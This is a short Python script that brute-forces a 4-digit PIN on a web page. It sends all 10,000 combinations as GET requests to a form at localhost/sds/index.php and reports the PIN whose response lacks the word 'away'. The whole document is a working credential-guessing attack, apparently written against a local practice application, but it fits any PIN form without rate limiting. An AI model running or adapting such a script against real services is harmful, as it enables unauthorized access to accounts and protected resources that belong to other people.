
import sys, itertools
from urllib.request import urlopen

def getAllPossibilties(charset, minlength, maxlength):
	return (''.join(candidate)
			for candidate in itertools.chain.from_iterable(
				itertools.product(charset, repeat=i)
				for i in range(minlength, maxlength + 1)
			)
		)


url = "http://localhost/sds/index.php?submit=Enter+the+Pin+Code&pin="

charset = "0123456789"
minlength = 4
maxlength = 4
allInputs = list(getAllPossibilties(charset, minlength, maxlength))

for pin in allInputs:
        url2=url+pin
        f =str(urlopen(url2).read())        
        if "away" in f:
                print("[-] wrong pin : {0}".format(pin))
        else:
                print("[+] correct pin : {0}".format(pin))
                break
        

